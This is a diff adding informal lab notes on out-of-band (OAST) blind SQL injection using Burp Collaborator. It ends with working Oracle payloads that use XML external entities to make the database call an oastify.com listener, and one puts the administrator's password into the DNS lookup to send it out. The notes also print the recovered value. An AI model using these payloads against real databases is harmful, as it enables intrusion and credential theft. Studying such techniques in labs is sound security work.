@@ -1,0 +1,51 @@
+🚨 What is OAST?
+OAST = Out-Of-Band Application Security Testing
+
+It means: instead of checking the server’s response, you watch for something the server does in the background, like making a DNS or HTTP request to your server.
+
+📦 How OAST Works in SQLi
+If you can make the database send a DNS or HTTP request to your own server, you know your injection worked. This is perfect for blind SQLi, where nothing visible happens in the page.
+
+✅ Requirements:
+You need an external listener — a server that waits for DNS/HTTP requests.
+You can use:
+
+Burp Collaborator (built into Burp Suite Pro)
+
+requestbin, dnslog.cn, or your own public server
+
+✅ What is OAST (Out-of-Band Application Security Testing)?
+OAST is a trick to detect SQL injection by forcing the database to make a network request to a server you control (like a DNS lookup or HTTP call).
+
+Think of it like this:
+You can't see the SQLi result on the page...
+So instead, you say:
+👉 “Hey DB, call my phone number (server) if my injection works!”
+
+And if you get that call (= network request), it means your SQLi worked.
+
+🧰 What Do You Need?
+You need a listener — a server that can watch for network requests.
+
+🛠 Use Burp Collaborator:
+
+Built into Burp Suite Professional
+
+Lets you generate a unique subdomain
+
+Tells you if the server makes DNS/HTTP calls to that domain
+
+
+
+
+cdtfxv57bxgwnicb39ig2qb4avgm4cs1.oastify.com
+LAB FINISHED THIS PAYLOAD CONFIRMS IF IT IS VULN OR NOT
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cdtfxv57bxgwnicb39ig2qb4avgm4cs1.oastify.com"> %remote;]>'),'/l') FROM dual)--
+
+NEXT LAB FIND ADMIN PASS
+Default PAYLOAD
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.cdtfxv57bxgwnicb39ig2qb4avgm4cs1.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+
+And this will give the answer = 66qm6y8qe8t8p9oibyuc
